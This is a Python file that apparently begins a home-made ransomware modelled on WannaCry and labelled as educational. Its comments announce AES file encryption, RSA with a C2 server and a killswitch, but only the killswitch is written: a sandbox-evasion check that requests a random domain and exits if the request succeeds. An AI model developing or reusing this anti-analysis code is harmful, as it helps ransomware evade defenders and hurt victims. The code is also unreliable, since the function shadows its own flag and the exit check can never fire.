# This is a custom made malware developped for educationnal
# The idea is that it's a simplified version of Wannacry in Python (cause it's the language I know the most)
# It uses somme functionnalities of Wannacry and other ransomwares like encrypting files in AES, then RAS with a C2, Having a killswitch to prevent analysis, ...
# Author : ch4rybd3@protonmail.com

import requests
import sys
import random
import string

killswitch = False

# The killswitch, used for determining if the script is ran inside of a sandbox with things like Fakenet-NG, ... that render a 200 for every web request done during analysis 
def killswitch():
    url = ''.join(random.choices(string.ascii_letters+string.digits, k=40))+ ".com"
    print(url)
    try:
        r=requests.get(url)
        print(r.status_code)
        if r.status_code ==200:
            killswitch = True
            print(killswitch)
        else:
            killswitch = False
            print(killswitch)
    except requests.exceptions.RequestException as e:
        killswitch = False
        print(killswitch)
    

killswitch()
if killswitch == True:
    sys.exit()
else:
    print("Go!")